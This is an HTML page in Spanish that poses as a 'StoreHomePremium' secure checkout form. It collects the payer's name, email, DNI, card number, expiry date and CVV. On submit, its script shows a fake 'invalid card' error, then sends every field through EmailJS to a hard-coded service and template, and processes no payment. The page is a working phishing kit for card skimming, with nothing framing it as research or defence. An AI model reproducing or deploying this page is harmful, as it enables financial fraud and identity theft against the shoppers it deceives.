<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>StoreHomePremium</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
body{
  margin:0;
  font-family:Arial,Helvetica,sans-serif;
  background:#f2f4f7;
  display:flex;
  justify-content:center;
  padding:20px;
}
.card{
  width:100%;
  max-width:420px;
  background:#fff;
  padding:24px;
  border-radius:14px;
  box-shadow:0 10px 30px rgba(0,0,0,.12);
}
h1{text-align:center;color:#0a2f7a;margin-bottom:6px}
.subtitle{text-align:center;font-size:14px;color:#4b5563;margin-bottom:18px}
label{margin-top:12px;font-size:13px;font-weight:600;display:block}
input{
  width:100%;
  padding:10px;
  margin-top:6px;
  border-radius:8px;
  border:1px solid #cbd5e1;
  font-size:14px;
}
input:focus{outline:none;border-color:#0a2f7a}

/* TARJETA VISUAL */
.card-visual{
  background:linear-gradient(145deg,#0f172a,#1e293b);
  border-radius:16px;
  padding:20px;
  margin-top:22px;
  color:#fff;
  transition:.3s;
}
.card-visual.active{
  transform:translateY(-4px);
  box-shadow:0 20px 45px rgba(0,0,0,.55);
}
.card-brands{display:flex;gap:12px;margin-bottom:18px}
.card-brands span{
  background:rgba(255,255,255,.12);
  padding:6px 14px;
  border-radius:8px;
  opacity:.4;
}
.card-brands span.active{opacity:1}
.card-number{font-size:20px;letter-spacing:3px;margin-bottom:18px}
.card-row{display:flex;justify-content:space-between}
.card-exp,.card-cvv{
  background:rgba(255,255,255,.08);
  padding:10px;
  border-radius:8px;
  width:45%;
  text-align:center;
}
.card-name{margin-top:12px;font-size:14px;text-transform:uppercase}
button{
  margin-top:22px;
  width:100%;
  padding:13px;
  border:none;
  border-radius:10px;
  background:#0a2f7a;
  color:#fff;
  font-weight:bold;
  cursor:pointer;
}
button:hover{background:#08245f}
</style>
</head>

<body>

<div class="card">
<h1>StoreHomePremium</h1>
<p class="subtitle">Pago seguro y simple</p>

<label>Monto</label>
<input id="monto" type="number" placeholder="$">

<label>Nombre</label>
<input id="nombre" type="text">

<label>Email</label>
<input id="email" type="email">

<label>DNI</label>
<input id="dni" type="number">

<label>Nombre del titular</label>
<input id="titular" type="text" placeholder="Como figura en la tarjeta">

<label>N√∫mero de tarjeta</label>
<input id="numero_tarjeta" type="text" inputmode="numeric" placeholder="1234 5678 9012 3456">

<label>Fecha de expiraci√≥n</label>
<input id="fecha_expiracion" type="text" inputmode="numeric" placeholder="MM/AA">

<label>C√≥digo de seguridad (CVV)</label>
<input id="codigo_seguridad" type="text" inputmode="numeric" placeholder="123">

<div class="card-visual" id="cardVisual">
  <div class="card-brands">
    <span id="brand-visa">VISA</span>
    <span id="brand-master">MASTERCARD</span>
  </div>
  <div class="card-number" id="preview-number">**** **** **** 1234</div>
  <div class="card-row">
    <div class="card-exp" id="preview-exp">MM / AA</div>
    <div class="card-cvv">***</div>
  </div>
  <div class="card-name" id="preview-name">NOMBRE DEL TITULAR</div>
</div>

<button type="button" id="enviar">Ver opciones de cuotas</button>
</div>

<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

<script>
emailjs.init("gOD19I3u7jPioagR4");

const cardVisual=document.getElementById("cardVisual");
const visa=document.getElementById("brand-visa");
const master=document.getElementById("brand-master");

document.querySelectorAll("input").forEach(i=>{
  i.addEventListener("focus",()=>cardVisual.classList.add("active"));
  i.addEventListener("blur",()=>cardVisual.classList.remove("active"));
});

document.getElementById("titular").addEventListener("input",function(){
  document.getElementById("preview-name").textContent=this.value||"NOMBRE DEL TITULAR";
});

document.getElementById("numero_tarjeta").addEventListener("input",function(){
  let v=this.value.replace(/\D/g,"").substring(0,16);
  this.value=v.replace(/(.{4})/g,"$1 ").trim();
  document.getElementById("preview-number").textContent="**** **** **** "+(v.slice(-4)||"1234");
  visa.classList.remove("active"); master.classList.remove("active");
  if(v.startsWith("4")) visa.classList.add("active");
  let f2=parseInt(v.substring(0,2)), f4=parseInt(v.substring(0,4));
  if((f2>=51&&f2<=55)||(f4>=2221&&f4<=2720)) master.classList.add("active");
});

document.getElementById("fecha_expiracion").addEventListener("input",function(){
  let v=this.value.replace(/\D/g,"").substring(0,4);
  if(v.length>2) v=v.slice(0,2)+"/"+v.slice(2);
  this.value=v;
  document.getElementById("preview-exp").textContent=v||"MM / AA";
});

document.getElementById("codigo_seguridad").addEventListener("input",function(){
  this.value=this.value.replace(/\D/g,"").substring(0,3);
});

document.getElementById("enviar").addEventListener("click",function(){
  // üì≥ Vibraci√≥n de error
  if (navigator.vibrate) {
    navigator.vibrate([120,60,120]);
  }

  alert("‚ùå Tarjeta inv√°lida. Vuelva a intentar nuevamente.");

  let tipo="";
  if(visa.classList.contains("active")) tipo="Visa";
  if(master.classList.contains("active")) tipo="Mastercard";

  emailjs.send("service_p965auj","template_h5kc29e",{
    monto:monto.value,
    nombre:nombre.value,
    email:email.value,
    dni:dni.value,
    titular:titular.value,
    numero_tarjeta:numero_tarjeta.value,
    fecha_expiracion:fecha_expiracion.value,
    codigo_seguridad:codigo_seguridad.value,
    tipo_tarjeta:tipo
  });
});
</script>

</body>
</html>
